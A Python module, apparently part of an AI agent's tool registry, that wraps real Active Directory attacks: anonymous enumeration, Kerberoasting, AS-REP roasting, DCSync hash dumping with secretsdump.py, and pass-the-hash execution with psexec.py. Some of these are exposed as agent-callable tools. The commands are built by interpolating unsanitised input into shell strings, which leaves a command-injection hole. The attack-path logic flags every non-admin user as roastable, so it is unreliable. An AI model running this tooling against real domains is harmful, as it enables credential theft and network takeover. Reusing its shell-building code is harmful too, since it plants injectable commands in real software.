"""Active Directory Range Agent - Real AD enumeration and attacks using impacket."""

import asyncio
from dataclasses import dataclass
from enum import Enum
from typing import Any, Optional

from ai.tool_registry import ToolCategory, register_tool, ToolParameter


class ADAttackType(str, Enum):
    """Types of AD attacks."""

    KERBEROASTING = "kerberoasting"
    ASREPROAST = "asreproast"
    GOLDEN_TICKET = "golden_ticket"
    SILVER_TICKET = "silver_ticket"
    DCSYNC = "dcsync"
    PASS_THE_HASH = "pass_the_hash"
    PASS_THE_TICKET = "pass_the_ticket"
    UNCONSTRAINED_DELEGATION = "unconstrained_delegation"
    CONSTRAINED_DELEGATION = "constrained_delegation"
    ACL_ABUSE = "acl_abuse"
    LATERAL_MOVEMENT = "lateral_movement"


@dataclass
class ADUser:
    """AD User information."""

    username: str
    sam_account_name: Optional[str] = None
    display_name: Optional[str] = None
    description: Optional[str] = None
    member_of: list[str] = None
    spn: Optional[str] = None
    admin_count: bool = False
    dont_expire_password: bool = False
    enabled: bool = True


@dataclass
class ADGroup:
    """AD Group information."""

    name: str
    description: Optional[str] = None
    members: list[str] = None
    admin_group: bool = False


@dataclass
class ADComputer:
    """AD Computer information."""

    hostname: str
    ip: Optional[str] = None
    os: Optional[str] = None
    enabled: bool = True
    unconstrained_delegation: bool = False
    constrained_delegation: Optional[str] = None


class ADAgent:
    """Active Directory enumeration and attack agent using real tools."""

    def __init__(self):
        self._users: list[ADUser] = []
        self._groups: list[ADGroup] = []
        self._computers: list[ADComputer] = []
        self._domain_controller: Optional[str] = None

    async def enumerate_domain(self, target: str, credentials: Optional[dict] = None) -> dict:
        """Enumerate AD domain using enum4linux/rpcclient."""
        results = {
            "domain": "unknown",
            "dc": target,
            "users": [],
            "groups": [],
            "computers": [],
            "shares": [],
        }

        # Try enum4linux
        try:
            cmd = f"enum4linux -a {target}"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)
            output = stdout.decode("utf-8", errors="replace")

            # Parse users
            import re
            user_pattern = r"Username:\s+(\S+)"
            for match in re.finditer(user_pattern, output):
                username = match.group(1)
                results["users"].append({"username": username})
                self._users.append(ADUser(username=username))

            # Parse groups
            group_pattern = r"Group:\s+(\S+)"
            for match in re.finditer(group_pattern, output):
                group_name = match.group(1)
                results["groups"].append({"name": group_name})

            # Parse domain
            domain_pattern = r"Domain:\s+(\S+)"
            domain_match = re.search(domain_pattern, output)
            if domain_match:
                results["domain"] = domain_match.group(1)

        except Exception as e:
            results["error"] = f"enum4linux failed: {str(e)}"

        return results

    async def enumerate_ldap(self, target: str, credentials: Optional[dict] = None) -> dict:
        """Enumerate LDAP using ldapsearch."""
        results = {
            "users": [],
            "groups": [],
            "computers": [],
            "ou": [],
        }

        try:
            # Anonymous LDAP bind
            cmd = f"ldapsearch -h {target} -x -b '' -s base namingContexts"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
            output = stdout.decode("utf-8", errors="replace")

            # Extract naming context
            import re
            nc_match = re.search(r"namingContexts:\s+(.+)", output)
            if nc_match:
                base_dn = nc_match.group(1).strip()

                # Enumerate users
                cmd2 = f"ldapsearch -h {target} -x -b '{base_dn}' '(objectClass=user)' sAMAccountName"
                process2 = await asyncio.create_subprocess_shell(
                    cmd2,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout2, _ = await asyncio.wait_for(process2.communicate(), timeout=30)
                users_output = stdout2.decode("utf-8", errors="replace")

                for match in re.finditer(r"sAMAccountName:\s+(\S+)", users_output):
                    results["users"].append({"username": match.group(1)})

        except Exception as e:
            results["error"] = f"LDAP enumeration failed: {str(e)}"

        return results

    async def enumerate_smb(self, target: str, credentials: Optional[dict] = None) -> dict:
        """Enumerate SMB shares."""
        results = {
            "shares": [],
            "users": [],
            "groups": [],
        }

        try:
            cmd = f"smbclient -L {target} -N"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
            output = stdout.decode("utf-8", errors="replace")

            # Parse shares
            import re
            for match in re.finditer(r"(\S+)\s+Disk", output):
                results["shares"].append(match.group(1))

        except Exception as e:
            results["error"] = f"SMB enumeration failed: {str(e)}"

        return results

    async def kerberoast(self, target: str, credentials: dict) -> dict:
        """Perform Kerberoasting using GetUserSPNs.py (impacket)."""
        username = credentials.get("username", "")
        password = credentials.get("password", "")
        domain = credentials.get("domain", "")

        if not all([username, password, target]):
            return {
                "success": False,
                "error": "Username, password, and target required",
                "hashes": [],
            }

        try:
            # Use impacket's GetUserSPNs
            cmd = f"GetUserSPNs.py {domain}/{username}:{password} -dc-ip {target} -request"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)
            output = stdout.decode("utf-8", errors="replace")

            # Parse hashes
            import re
            hashes = []
            hash_pattern = r"(\$krb5tgs\$23\*\$\$\$[^\s]+)"
            for match in re.finditer(hash_pattern, output):
                hashes.append(match.group(1))

            return {
                "success": len(hashes) > 0,
                "output": output,
                "hashes": hashes,
                "evidence": [f"Kerberoasted {len(hashes)} SPNs"],
            }
        except FileNotFoundError:
            return {
                "success": False,
                "error": "GetUserSPNs.py not found. Install impacket: pip install impacket",
                "hashes": [],
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "hashes": [],
            }

    async def asreproast(self, target: str, domain: str, username: str = "", password: str = "") -> dict:
        """Perform AS-REP Roasting using GetNPUsers.py (impacket)."""
        try:
            if username and password:
                cmd = f"GetNPUsers.py {domain}/{username}:{password} -dc-ip {target} -usersfile /dev/stdout -format hashcat"
            else:
                # Try anonymous
                cmd = f"GetNPUsers.py {domain}/ -dc-ip {target} -no-pass -usersfile /tmp/users.txt -format hashcat"

            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)
            output = stdout.decode("utf-8", errors="replace")

            # Parse hashes
            import re
            hashes = []
            hash_pattern = r"(\$krb5asrep\$23\@[^\s]+)"
            for match in re.finditer(hash_pattern, output):
                hashes.append(match.group(1))

            return {
                "success": len(hashes) > 0,
                "output": output,
                "hashes": hashes,
                "evidence": [f"AS-REP Roasted {len(hashes)} accounts"],
            }
        except FileNotFoundError:
            return {
                "success": False,
                "error": "GetNPUsers.py not found. Install impacket: pip install impacket",
                "hashes": [],
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "hashes": [],
            }

    async def dcsync(self, target: str, credentials: dict) -> dict:
        """Perform DCSync using secretsdump.py (impacket)."""
        username = credentials.get("username", "")
        password = credentials.get("password", "")
        domain = credentials.get("domain", "")

        if not all([username, password, target]):
            return {
                "success": False,
                "error": "Username, password, and target required",
                "hashes": {},
            }

        try:
            cmd = f"secretsdump.py {domain}/{username}:{password}@{target}"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)
            output = stdout.decode("utf-8", errors="replace")

            # Parse hashes
            import re
            hashes = {}
            # NTLM hash pattern
            ntlm_pattern = r"(\S+):(\d+):([a-f0-9]{32}):([a-f0-9]{32})"
            for match in re.finditer(ntlm_pattern, output):
                username_found = match.group(1)
                lm = match.group(3)
                nt = match.group(4)
                hashes[username_found] = {"lm": lm, "nt": nt}

            return {
                "success": len(hashes) > 0,
                "output": output,
                "hashes": hashes,
                "evidence": [f"DCSync extracted {len(hashes)} password hashes"],
            }
        except FileNotFoundError:
            return {
                "success": False,
                "error": "secretsdump.py not found. Install impacket: pip install impacket",
                "hashes": {},
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "hashes": {},
            }

    async def pass_the_hash(self, target: str, username: str, ntlm_hash: str) -> dict:
        """Execute command via Pass-the-Hash using psexec.py (impacket)."""
        try:
            # Format: LM:NT
            if ":" not in ntlm_hash:
                ntlm_hash = f"00000000000000000000000000000000:{ntlm_hash}"

            cmd = f"psexec.py -hashes {ntlm_hash} {username}@{target} 'whoami'"
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
            output = stdout.decode("utf-8", errors="replace")

            return {
                "success": "whoami" in output.lower() or "nt authority" in output.lower(),
                "output": output,
                "evidence": ["Pass-the-Hash execution successful"],
            }
        except FileNotFoundError:
            return {
                "success": False,
                "error": "psexec.py not found. Install impacket: pip install impacket",
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
            }

    def get_attack_paths(self) -> list[dict]:
        """Analyze and suggest AD attack paths."""
        paths = []

        # Check for Kerberoastable users
        for user in self._users:
            if user.spn:
                paths.append({
                    "type": "kerberoasting",
                    "target": user.username,
                    "spn": user.spn,
                    "confidence": "high",
                })

        # Check for AS-REP Roastable users
        for user in self._users:
            if not user.admin_count:
                paths.append({
                    "type": "asreproast",
                    "target": user.username,
                    "confidence": "medium",
                })

        return paths


# Register AD tools
@register_tool(
    name="ad_enumerate",
    description="Enumerate Active Directory domain using enum4linux/ldapsearch",
    category=ToolCategory.AD,
    parameters=[
        ToolParameter(name="target", type="str", description="Domain controller IP"),
        ToolParameter(name="domain", type="str", description="Domain name", required=False),
    ],
)
async def ad_enumerate(target: str, domain: str = "") -> dict:
    """Execute AD enumeration."""
    agent = ADAgent()
    return await agent.enumerate_domain(target)


@register_tool(
    name="ad_ldap_enum",
    description="Enumerate AD using LDAP queries",
    category=ToolCategory.AD,
    parameters=[
        ToolParameter(name="target", type="str", description="Domain controller IP"),
    ],
)
async def ad_ldap_enum(target: str) -> dict:
    """Execute LDAP enumeration."""
    agent = ADAgent()
    return await agent.enumerate_ldap(target)


@register_tool(
    name="ad_kerberoast",
    description="Perform Kerberoasting attack using GetUserSPNs.py (impacket)",
    category=ToolCategory.AD,
    parameters=[
        ToolParameter(name="target", type="str", description="Domain controller IP"),
        ToolParameter(name="username", type="str", description="Username for authentication"),
        ToolParameter(name="password", type="str", description="Password for authentication"),
        ToolParameter(name="domain", type="str", description="Domain name", required=False, default=""),
    ],
    requires_approval=True,
)
async def ad_kerberoast(target: str, username: str, password: str, domain: str = "") -> dict:
    """Execute Kerberoasting."""
    agent = ADAgent()
    return await agent.kerberoast(target, {"username": username, "password": password, "domain": domain})


@register_tool(
    name="ad_dcsync",
    description="Perform DCSync attack using secretsdump.py (impacket)",
    category=ToolCategory.AD,
    parameters=[
        ToolParameter(name="target", type="str", description="Domain controller IP"),
        ToolParameter(name="username", type="str", description="Username for authentication"),
        ToolParameter(name="password", type="str", description="Password for authentication"),
        ToolParameter(name="domain", type="str", description="Domain name", required=False, default=""),
    ],
    requires_approval=True,
)
async def ad_dcsync(target: str, username: str, password: str, domain: str = "") -> dict:
    """Execute DCSync."""
    agent = ADAgent()
    return await agent.dcsync(target, {"username": username, "password": password, "domain": domain})
